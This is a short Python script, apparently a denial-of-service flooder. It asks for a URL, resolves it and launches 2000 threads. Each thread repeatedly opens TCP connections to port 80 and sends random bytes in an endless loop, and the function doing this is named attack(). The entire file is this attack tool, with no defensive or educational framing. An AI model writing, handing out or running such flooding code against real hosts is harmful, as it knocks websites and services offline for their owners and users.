import socket
import sys
import string
import random
import threading
import time

x=str(input("Enter a url : "))
port=80
ip=socket.gethostbyname(x)


def attack():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    x = data.encode()
    i=0
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip,port))
            s.send(x)
            print("packet sent successfully -> ",x)
            s.close()
        except socket.error:
            print(str(socket.error))
        i=i+1


j=0
for j in range(2000):
    t1 = threading.Thread(target=attack)
    t1.start()